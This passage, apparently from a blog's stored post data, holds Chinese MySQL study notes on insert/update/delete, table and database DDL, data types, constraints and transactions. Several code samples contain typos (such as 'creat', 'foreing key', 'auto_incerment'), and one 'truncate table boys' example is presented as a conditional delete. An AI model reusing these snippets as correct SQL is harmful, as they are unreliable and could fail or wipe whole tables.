表名\n```\n\n- 案例：将魅力值>100的男神信息删除\n\n```\ntruncate table boys;\n```\n\n\n\n## DDL语言\n\n1. DDL数据定义语言\n2. 表和库的管理\n\n### 库的操作\n\n1. 库的创建\n\n- 语法：\n\n```\ncreate database (if not exists)库名；\n```\n\n2. 库的删除\n\n- 语法：\n\n```\ndrop database if exists 库名；\n```\n\n\n\n### 表的管理\n\n1. 表的创建\n\n- 语法：\n\n```\ncreate  table 表名(\n\t列名 列的类型【(长度) (约束)】，  //长度和约束可选\n\t列名 列的类型【(长度) (约束)】，\n\t...\n)；\n```\n\n- 案例：创建表Book\n\n```\ncreat table book(\n\tid int, #编号\n\tbname varchar (20),  #图书名\n\tauthorid int,  #作者编号\n\tpublishdate datetime;  #出版日期\n)；\n```\n\n\n\n2. 表的修改\n\n- 语法：\n\n```\nalter table 表名 关键字 column 列名 列类型 约束\n```\n\n\n\n- 修改列名\n\n```\n//参考上个案例，创建表book\nalter table book change aolumn publish pubdate datetime;\n```\n\n- 修改列的类型或约束\n\n```\nalter table book modify column pubtade timestamp;\n```\n\n- 添加新列\n\n```\nalter table author add column annual double;\n```\n\n- 删除列\n\n```\nalter table author drop column annual;\n```\n\n- 修改表名\n\n```\nalter table  author rename to book_author;\n```\n\n\n\n3. 表的删除\n\n- 语法：\n\n```\ndrop table if exists book_author;\n```\n\n- 通用的写法：\n\n```\ndrop database if exists 旧库名；\ncreate database 新库名；\n\ndrop table if exists 旧表名；\ncreate table 表名（）；\n```\n\n\n\n4. 表的复制\n\n- 复制表的结构\n\n```\ncreate table copy like author;\n```\n\n- 复制表的结构+数据\n\n```\ncreate table copy2\nselect * from author;\n```\n\n- 只复制部分数据\n\n```\ncreate table copy3\nselect id, au_name\nfrom autor\nwhere nation='中国'；\n```\n\n- 复制部分结构\n\n```\ncreate table copy4\nselect id, au_name\nfrom author\nwhere 0;\n```\n\n\n\n###  常见的数据类型\n\n```\n数值型：\n\t\t整型\n\t\t小数：\n\t\t\t定点型\n\t\t\t浮点型\n字符型：\n\t\t较短的文本：char、varchar\n\t\t较长的文本：text，blob（较长的二进制数据）\n日期型\n```\n\n#### 整型\n\n1. 分类：tinyint, smallint, mediumint, int\\integer, bigint\n2. 特点：\n\n- 如果不设置无符号还是有符号，默认是有符号，如果想设置无符号，还需要添加unsigned关键字\n- 如果插入的数值超出了整型的范围，则插入的值为整型类型的最大值\n\n#### 小数\n\n1. 分类：\n\n- 浮点型： float(M, D) , double(M, D)\n- 定点型：dec(M, D) , decimal(M, D)\n\n2. 特点：\n\n- M：整数部位+加小数部位的总长度\n- D：小数部位长度\n- 如果超过范围，则插入临界值\n- M，D可以省略，如果是decimal，则默认M是10,D是0，  若是float和double，则会根据插入数值的精度来决定\n- 定点型精确度较高，如果要求插入数值的精确度较高如货币运算则考虑使用定点型\n\n#### 字符型\n\n较短的文本：char、varchar\n较长的文本：text，blob（较长的二进制数据）\n\n1. 特点：\n\n```\n          写法        M的意思                      特点        空间的耗费    效率  \nchar     char(M)    最大的字符数，可以省略，默认为1  固定长度字符    比较耗费    较高\nvarchar  varchar(M) 最大的字符数，不可以省略        可变长度字符    比较节省    较低\n```\n\n#### 日期型\n\n1. 分类：date 只保存日期\n\n   ​\t\t\ttime 只保存时间\n\n   ​\t\t\tyear 只保存年\n\n   ​\t\t\tdatetime 保存日期+时间\n\n   ​\t\t\ttimestamp 保存日期+时间\n\n2. 特点：\n\n```\n\t\t\t字节   范围          时区等的影响\ndatetime     8    1000-9999         不受\ntimestamp    4    1970-2038          受\n```\n\n\n\n### 常见约束\n\n1. 含义：一种限制，用于限制表中的数据，为了保证表中数据的准确性和可靠性\n\n2. 分类：\n\n```\n1. not null: 非空用于保证该字段值不能为空\n2. default： 默认，用于赋予该字段默认值\n3. primary key: 主键，用于保证该字段的值具有唯一性，并且非空\n4. unique：用于保证该字段的值的唯一性\n5. check：检查约束【MySQL中不支持】 \n6. foreing key:外键约束，用于限制俩个表的关系，用于保证该字段的值必须来自于主表的关联列的值，在从表添加外键约束，用于引用主表中某列的值\n```\n\n3. 添加约束的时机：\n\n```\n1. 创建表时\n2. 修改表时\n```\n\n4. 约束的添加分类：\n\n```\n1. 列级约束：\n\t直接在字段名和类型后面追加约束类型即可\n\t六大约束语法上都支持，但外键约束没有效果\n2. 表级约束：\n\t在所有字段的最下面：constraint 约束名 约束类型（字段名）\n\t除了非空、默认约束，其他都支持\n```\n\n5. 主键与唯一：\n\n```\n\t\t保证唯一性   是否允许为空   一个表中可以有多少个    是否允许组合\n主键\t\tY\t\t\t\tN\t\t\t一个\t\t\t\t允许，不推荐\n唯一\t\tY\t\t\t\tY\t\t\t多个 \t\t\t\t允许，不推荐\n```\n\n6. 外键约束\n\n```\n1. 要求在从表中设置外键关系\n2. 从表的外键列的类型和主表的关联列的类型要求一致或兼容，名称无要求\n3. 主表的关联列必须是一个key（一般是主键或唯一）\n4. 插入数据时，先插入主表，再插入从表，删除时相反\n# 添加外键约束：\nalter table stuinfo add constraint 表名字 foreing key(majorid) references major(id);\n```\n\n7. 修改表时添加约束：\n\n```\n1. 添加列级约束：\nalter table 表名 modify column 字段名 字段类型 新约束\n2. 添加表级约束：\nalter table 表名 add [constraint 约束名] 约束类型（字段名） 【外键的引用】\n```\n\n8. 修改表时删除约束：\n\n![NBXJgK.png](https://s1.ax1x.com/2020/06/25/NBXJgK.png)\n\n\n\n###  标识列\n\n1. 又称为自增长列，可以不用手动的插入值，系统提供默认的序列值\n2. 特点：\n\n```\n1. 标识列不一定要和主键搭配，但必须要和一个key搭配\n2. 一个表至多只有一个标识列\n3. 标识列的类型只能是数值型\n4.标识列可以通过 set auto_increment_incremennt= ;设置步长\n\t可以通过手动插入值，设置起始值\n```\n\n3. 修改表时设置标识列\n\n```\nalter table 表名 modify column 字段值 类型 key名 auto_incerment;\n```\n\n4. 修改表时删除标识列\n\n```\nalter table 表名 modify column 字段值 类型；\n```\n\n\n\n## TCL语言\n\n1. 事务控制语言，一个或一组sql语句组成一个执行单元，这个执行单元要么全部执行，要么全部不执行，比如转账的过程\n\n2. 事务的特性\n\n![NBXYjO.png](https://s1.ax1x.com/2020/06/25/NBXYjO.png)\n\n3. 事务的创建\n\n![NBX89x.png](https://s1.ax1x.com/2020/06/25/NBX89x.png)\n\n![NBXNuD.png](https://s1.ax1x.com/2020/06/25/NBXNuD.png)\n\n- 实例\n\n![NBXG36.png](https://s1.ax1x.com/2020/06/25/NBXG36.png)\n\n\n\n5. 事务隔离级别\n\n[![NBjXy8.md.png](https://s1.ax1x.com/2020/06/25/NBjXy8.md.png)](https://imgtu.com/i/NBjXy8)\n\n[![NBjOQf.md.png](https://s1.ax1x.com/2020/06/25/NBjOQf.md.png)](https://imgtu.com/i/NBjOQf)\n\n\n\n- MySQL中默认隔离级别 repeatable read\n- oracle中默认级别 read committed\n- 查看隔离级别 ：select @@tx_isolation;\n- 设置隔离级别 ：\n\n```\nset session 或 global transaction isolation level 隔离级别；\n```\n\n\n\n6. savepoint 节点名，设置保存点\n\n```\n# 演示savepoint的使用\nset autocommit = 0;\nstart transaction;\ndelete from account where id=25;\nsavepoint a;  #设置保存点\ndelete from account where id=28;\nrollback to a;  #回滚到保存点\n\nselect * from account;\n\n结果：id=28还在，id=25没有\n```\n\n\n\n\n\n","source":"_posts/数据库(二).md","raw":"---\ntitle: MYSQL(二)\ndate: 2020-09-14 14:06\nswiper: false # 将改文章放入轮播图中\nswiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片\nimg: 'http://cdn.mxrblog.cn/ct_15.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片\ncategories: 数据库\ntags: [mysql, sql, 数据库]   # 可以是数组\ntop: false\n---\n\n# 数据库（二）\n\n[参考的相关视频资料连接](https://www.bilibili.com/video/BV12b411K7Zu/?p=105)\n\n## DML语言\n\n- 数据操作语言：\n  - 插入：insert\n  - 修改：update\n  - 删除：delete\n\n### 插入语句\n\n#### 方式一：经典插入语句\n\n<!--more-->\n\n- 语法\n\n```\ninsert into 表名（列名1, 列名2, ...）\nvalues （值1, 值2, ...）;\n```\n\n- 注意事项：\n  1. 插入的值的类型与列的类型一致或兼容\n  2. 可以为NULL的列可以插入NULL值，不为NULL的列必须插入值\n  3. 列的顺序可以调换，但是插入的值必须和列相匹配\n  4. 列数和值得个数必须相一致\n  5. 可以省略列名，默认所有列，而且列的顺序和表中的顺序一致\n\n```\ninsert into beauty\nvalues(列1, 列2, ...);            //省略列名，默认所有列\n```\n\n#### 方式二：\n\n1. 语法：\n\n```\ninsert into 表名\nset 列名1=值1，列名2=值2，...\n```\n\n2. 案例:\n\n```\ninsert into beauty\nset id=19, name='章子怡'，phone='110';\n```\n\n#### 注意事项\n\n1. 方式一支持插入多行，方式二不行\n2. 方式一支持子查询，方式二不行\n\n\n\n### 修改语句\n\n#### 修改单表的记录（*重点）\n\n1. 语法：\n\n```\nupdate 表名\nset 列=新值，列=新值，...\nwhere 筛选条件；\n```\n\n2. 案例：修改boys表中id号位2的名称为张飞，魅力值10\n\n```\nupdate boys set boyname='张飞'， usercp=10\nwhere id=2;\n```\n\n#### 修改多表得记录(了解即可)\n\n1. 语法：\n\n```\nsql92语法：\nupdate 表1 别名， 表2 别名\nset 列=值，...\nwhere 连接条件\nand 筛选条件\n\nsql99语法：\nupdate 表1 别名\ninner 连接类型 join 表2 别名\non 链接条件\nset 列=值，...\n```\n\n\n\n### 删除语句\n\n1. 方式一：delete \n\n- 删除整行\n- 单表的删除\n\n```\n语法：\ndelete from 表名 where 筛选条件\n```\n\n- 案例：删除手机号以3结尾的女孩信息\n\n```\ndelete from girls \nwhere phon like '%3';\n```\n\n2. 方式二：truncate\n\n```\n语法：\ntruncate table 表名\n```\n\n- 案例：将魅力值>100的男神信息删除\n\n```\ntruncate table boys;\n```\n\n\n\n## DDL语言\n\n1. DDL数据定义语言\n2. 表和库的管理\n\n### 库的操作\n\n1. 库的创建\n\n- 语法：\n\n```\ncreate database (if not exists)库名；\n```\n\n2. 库的删除\n\n- 语法：\n\n```\ndrop database if exists 库名；\n```\n\n\n\n### 表的管理\n\n1. 表的创建\n\n- 语法：\n\n```\ncreate  table 表名(\n\t列名 列的类型【(长度) (约束)】，  //长度和约束可选\n\t列名 列的类型【(长度) (约束)】，\n\t...\n)；\n```\n\n- 案例：创建表Book\n\n```\ncreat table book(\n\tid int, #编号\n\tbname varchar (20),  #图书名\n\tauthorid int,  #作者编号\n\tpublishdate datetime;  #出版日期\n)；\n```\n\n\n\n2. 表的修改\n\n- 语法：\n\n```\nalter table 表名 关键字 column 列名 列类型 约束\n```\n\n\n\n- 修改列名\n\n```\n//参考上个案例，创建表book\nalter table book change aolumn publish pubdate datetime;\n```\n\n- 修改列的类型或约束\n\n```\nalter table book modify column pubtade timestamp;\n```\n\n- 添加新列\n\n```\nalter table author add column annual double;\n```\n\n- 删除列\n\n```\nalter table author drop column annual;\n```\n\n- 修改表名\n\n```\nalter table  author rename to book_author;\n```\n\n\n\n3. 表的删除\n\n- 语法：\n\n```\ndrop table if exists book_author;\n```\n\n- 通用的写法：\n\n```\ndrop database if exists 旧库名；\ncreate database 新库名；\n\ndrop table if exists 旧表名；\ncreate table 表名（）；\n```\n\n\n\n4. 表的复制\n\n- 复制表的结构\n\n```\ncreate table copy like author;\n```\n\n- 复制表的结构+数据\n\n```\ncreate table copy2\nselect * from author;\n```\n\n- 只复制部分数据\n\n```\ncreate table copy3\nselect id, au_name\nfrom autor\nwhere nation='中国'；\n```\n\n- 复制部分结构\n\n```\ncreate table copy4\nselect id, au_name\nfrom author\nwhere 0;\n```\n\n\n\n###  常见的数据类型\n\n```\n数值型：\n\t\t整型\n\t\t小数：\n\t\t\t定点型\n\t\t\t浮点型\n字符型：\n\t\t较短的文本：char、varchar\n\t\t较长的文本：text，blob（较长的二进制数据）\n日期型\n```\n\n#### 整型\n\n1. 分类：tinyint, smallint, mediumint, int\\integer, bigint\n2. 特点：\n\n- 如果不设置无符号还是有符号，默认是有符号，如果想设置无符号，还需要添加unsigned关键字\n- 如果插入的数值超出了整型的范围，则插入的值为整型类型的最大值\n\n#### 小数\n\n1. 分类：\n\n- 浮点型： float(M, D) , double(M, D)\n- 定点型：dec(M, D) , decimal(M, D)\n\n2. 特点：\n\n- M：整数部位+加小数部位的总长度\n- D：小数部位长度\n- 如果超过范围，则插入临界值\n- M，D可以省略，如果是decimal，则默认M是10,D是0，  若是float和double，则会根据插入数值的精度来决定\n- 定点型精确度较高，如果要求插入数值的精确度较高如货币运算则考虑使用定点型\n\n#### 字符型\n\n较短的文本：char、varchar\n较长的文本：text，blob（较长的二进制数据）\n\n1. 特点：\n\n```\n          写法        M的意思                      特点        空间的耗费    效率  \nchar     char(M)    最大的字符数，可以省略，默认为1  固定长度字符    比较耗费    较高\nvarchar  varchar(M) 最大的字符数，不可以省略        可变长度字符    比较节省    较低\n```\n\n#### 日期型\n\n1. 分类：date 只保存日期\n\n   ​\t\t\ttime 只保存时间\n\n   ​\t\t\tyear 只保存年\n\n   ​\t\t\tdatetime 保存日期+时间\n\n   ​\t\t\ttimestamp 保存日期+时间\n\n2. 特点：\n\n```\n\t\t\t字节   范围          时区等的影响\ndatetime     8    1000-9999         不受\ntimestamp    4    1970-2038          受\n```\n\n\n\n### 常见约束\n\n1. 含义：一种限制，用于限制表中的数据，为了保证表中数据的准确性和可靠性\n\n2. 分类：\n\n```\n1. not null: 非空用于保证该字段值不能为空\n2. default： 默认，用于赋予该字段默认值\n3. primary key: 主键，用于保证该字段的值具有唯一性，并且非空\n4. unique：用于保证该字段的值的唯一性\n5. check：检查约束【MySQL中不支持】 \n6. foreing key:外键约束，用于限制俩个表的关系，用于保证该字段的值必须来自于主表的关联列的值，在从表添加外键约束，用于引用主表中某列的值\n```\n\n3. 添加约束的时机：\n\n```\n1. 创建表时\n2. 修改表时\n```\n\n4. 约束的添加分类：\n\n```\n1. 列级约束：\n\t直接在字段名和类型后面追加约束类型即可\n\t六大约束语法上都支持，但外键约束没有效果\n2. 表级约束：\n\t在所有字段的最下面：constraint 约束名 约束类型（字段名）\n\t除了非空、默认约束，其他都支持\n```\n\n5. 主键与唯一：\n\n```\n\t\t保证唯一性   是否允许为空   一个表中可以有多少个    是否允许组合\n主键\t\tY\t\t\t\tN\t\t\t一个\t\t\t\t允许，不推荐\n唯一\t\tY\t\t\t\tY\t\t\t多个 \t\t\t\t允许，不推荐\n```\n\n6. 外键约束\n\n```\n1. 要求在从表中设置外键关系\n2. 从表的外键列的类型和主表的关联列的类型要求一致或兼容，名称无要求\n3. 主表的关联列必须是一个key（一般是主键或唯一）\n4. 插入数据时，先插入主表，再插入从表，删除时相反\n# 添加外键约束：\nalter table stuinfo add constraint 表名字 foreing key(majorid) references major(id);\n```\n\n7. 修改表时添加约束：\n\n```\n1. 添加列级约束：\nalter table 表名 modify column 字段名 字段类型 新约束\n2. 添加表级约束：\nalter table 表名 add [constraint 约束名] 约束类型（字段名） 【外键的引用】\n```\n\n8. 修改表时删除约束：\n\n![NBXJgK.png](https://s1.ax1x.com/2020/06/25/NBXJgK.png)\n\n\n\n###  标识列\n\n1. 又称为自增长列，可以不用手动的插入值，系统提供默认的序列值\n2. 特点：\n\n```\n1. 标识列不一定要和主键搭配，但必须要和一个key搭配\n2. 一个表至多只有一个标识列\n3. 标识列的类型只能是数值型\n4.标识列可以通过 set auto_increment_incremennt= ;设置步长\n\t可以通过手动插入值，设置起始值\n```\n\n3. 修改表时设置标识列\n\n```\nalter table 表名 modify column 字段值 类型 key名 auto_incerment;\n```\n\n4. 修改表时删除标识列\n\n```\nalter table 表名 modify column 字段值 类型；\n```\n\n\n\n## TCL语言\n\n1. 事务控制语言，一个或一组sql语句组成一个执行单元，这个执行单元要么全部执行，要么全部不执行，比如转账的过程\n\n2. 事务的特性\n\n![NBXYjO.png](https://s1.ax1x.com/2020/06/25/NBXYjO.png)\n\n3. 事务的创建\n\n![NBX89x.png](https://s1.ax1x.com/2020/06/25/NBX89x.png)\n\n![NBXNuD.png](https://s1.ax1x.com/2020/06/25/NBXNuD.png)\n\n- 实例\n\n![NBXG36.png](https://s1.ax1x.com/2020/06/25/NBXG36.png)\n\n\n\n5. 事务隔离级别\n\n[![NBjXy8.md.png](https://s1.ax1x.com/2020/06/25/NBjXy8.md.png)](https://imgtu.com/i/NBjXy8)\n\n[![NBjOQf.md.png](https://s1.ax1x.com/2020/06/25/NBjOQf.md.png)](https://imgtu.com/i/NBjOQf)\n\n\n\n- MySQL中默认隔离级别 repeatable read\n- oracle中默认级别 read committed\n- 查看隔离级别 ：select @@tx_isolation;\n- 设置隔离级别 ：\n\n```\nset session 或 global transaction isolation level 隔离级别；\n```\n\n\n\n6. savepoint 节点名，设置保存点\n\n```\n# 演示savepoint的使用\nset autocommit = 0;\nstart transaction;\ndelete from account where id=25;\nsavepoint a;  #设置保存点\ndelete from account where id=28;\nrollback to a;  #回滚到保存点\n\nselect * from account;\n\n结果：id=28还在，id=25没有\n```\n\n\n\n\n\n","slug":"数据库(二)","published":1,"updated":"2021-06-20T03:05:10.699Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq4nzay8000z7vvt92qu7pws","content":"<h1 id=\"数据库（二）\"><a href=\"#数据库（二）\" class=\"headerlink\" title=\"数据库（二）\"></a>数据库（二）</h1><p><a href=\"https://www.bilibili.com/video/BV12b411K7Zu/?p=105\">参考的相关视频资料连接</a></p>\n<h2 id=\"DML语言\"><a href=\"#DML语言\" class=\"headerlink\" title=\"DML语言\"></a>DML语言</h2><ul>\n<li>数据操作语言：<ul>\n<li>插入：insert</li>\n<li>修改：update</li>\n<li>删除：delete</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"插入语句\"><a href=\"#插入语句\" class=\"headerlink\" title=\"插入语句\"></a>插入语句</h3><h4 id=\"方式一：经典插入语句\"><a href=\"#方式一：经典插入语句\" class=\"headerlink\" title=\"方式一：经典插入语句\"></a>方式一：经典插入语句</h4><span id=\"more\"></span>\n\n<ul>\n<li>语法</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">insert into 表名（列名1, 列名2, ...）</span><br><span class=\"line\">values （值1, 值2, ...）;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>注意事项：<ol>\n<li>插入的值的类型与列的类型一致或兼容</li>\n<li>可以为NULL的列可以插入NULL值，不为NULL的列必须插入值</li>\n<li>列的顺序可以调换，但是插入的值必须和列相匹配</li>\n<li>列数和值得个数必须相一致</li>\n<li>可以省略列名，默认所有列，而且列的顺序和表中的顺序一致</li>\n</ol>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">insert into beauty</span><br><span class=\"line\">values(列1, 列2, ...);            //省略列名，默认所有列</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"方式二：\"><a href=\"#方式二：\" class=\"headerlink\" title=\"方式二：\"></a>方式二：</h4><ol>\n<li>语法：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">insert into 表名</span><br><span class=\"line\">set 列名1=值1，列名2=值2，...</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>案例:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">insert into beauty</span><br><span class=\"line\">set id=19, name=&#x27;章子怡&#x27;，phone=&#x27;110&#x27;;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项\"></a>注意事项</h4><ol>\n<li>方式一支持插入多行，方式二不行</li>\n<li>方式一支持子查询，方式二不行</li>\n</ol>\n<h3 id=\"修改语句\"><a href=\"#修改语句\" class=\"headerlink\" title=\"修改语句\"></a>修改语句</h3><h4 id=\"修改单表的记录（-重点）\"><a href=\"#修改单表的记录（-重点）\" class=\"headerlink\" title=\"修改单表的记录（*重点）\"></a>修改单表的记录（*重点）</h4><ol>\n<li>语法：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">update 表名</span><br><span class=\"line\">set 列=新值，列=新值，...</span><br><span class=\"line\">where 筛选条件；</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>案例：修改boys表中id号位2的名称为张飞，魅力值10</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">update boys set boyname=&#x27;张飞&#x27;， usercp=10</span><br><span class=\"line\">where id=2;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"修改多表得记录-了解即可\"><a href=\"#修改多表得记录-了解即可\" class=\"headerlink\" title=\"修改多表得记录(了解即可)\"></a>修改多表得记录(了解即可)</h4><ol>\n<li>语法：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sql92语法：</span><br><span class=\"line\">update 表1 别名， 表2 别名</span><br><span class=\"line\">set 列=值，...</span><br><span class=\"line\">where 连接条件</span><br><span class=\"line\">and 筛选条件</span><br><span class=\"line\"></span><br><span class=\"line\">sql99语法：</span><br><span class=\"line\">update 表1 别名</span><br><span class=\"line\">inner 连接类型 join 表2 别名</span><br><span class=\"line\">on 链接条件</span><br><span class=\"line\">set 列=值，...</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"删除语句\"><a href=\"#删除语句\" class=\"headerlink\" title=\"删除语句\"></a>删除语句</h3><ol>\n<li>方式一：delete </li>\n</ol>\n<ul>\n<li>删除整行</li>\n<li>单表的删除</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">语法：</span><br><span class=\"line\">delete from 表名 where 筛选条件</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>案例：删除手机号以3结尾的女孩信息</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">delete from girls </span><br><span class=\"line\">where phon like &#x27;%3&#x27;;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>方式二：truncate</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">语法：</span><br><span class=\"line\">truncate table 表名</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>案例：将魅力值&gt;100的男神信息删除</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">truncate table boys;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"DDL语言\"><a href=\"#DDL语言\" class=\"headerlink\" title=\"DDL语言\"></a>DDL语言</h2><ol>\n<li>DDL数据定义语言</li>\n<li>表和库的管理</li>\n</ol>\n<h3 id=\"库的操作\"><a href=\"#库的操作\" class=\"headerlink\" title=\"库的操作\"></a>库的操作</h3><ol>\n<li>库的创建</li>\n</ol>\n<ul>\n<li>语法：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create database (if not exists)库名；</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>库的删除</li>\n</ol>\n<ul>\n<li>语法：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">drop database if exists 库名；</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"表的管理\"><a href=\"#表的管理\" class=\"headerlink\" title=\"表的管理\"></a>表的管理</h3><ol>\n<li>表的创建</li>\n</ol>\n<ul>\n<li>语法：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create  table 表名(</span><br><span class=\"line\">\t列名 列的类型【(长度) (约束)】，  //长度和约束可选</span><br><span class=\"line\">\t列名 列的类型【(长度) (约束)】，</span><br><span class=\"line\">\t...</span><br><span class=\"line\">)；</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>案例：创建表Book</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">creat table book(</span><br><span class=\"line\">\tid int, #编号</span><br><span class=\"line\">\tbname varchar (20),  #图书名</span><br><span class=\"line\">\tauthorid int,  #作者编号</span><br><span class=\"line\">\tpublishdate datetime;  #出版日期</span><br><span class=\"line\">)；</span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"2\">\n<li>表的修改</li>\n</ol>\n<ul>\n<li>语法：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alter table 表名 关键字 column 列名 列类型 约束</span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li>修改列名</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//参考上个案例，创建表book</span><br><span class=\"line\">alter table book change aolumn publish pubdate datetime;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>修改列的类型或约束</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alter table book modify column pubtade timestamp;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>添加新列</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alter table author add column annual double;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>删除列</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alter table author drop column annual;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>修改表名</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alter table  author rename to book_author;</span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"3\">\n<li>表的删除</li>\n</ol>\n<ul>\n<li>语法：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">drop table if exists book_author;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>通用的写法：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">drop database if exists 旧库名；</span><br><span class=\"line\">create database 新库名；</span><br><span class=\"line\"></span><br><span class=\"line\">drop table if exists 旧表名；</span><br><span class=\"line\">create table 表名（）；</span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"4\">\n<li>表的复制</li>\n</ol>\n<ul>\n<li>复制表的结构</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create table copy like author;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>复制表的结构+数据</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create table copy2</span><br><span class=\"line\">select * from author;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>只复制部分数据</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td 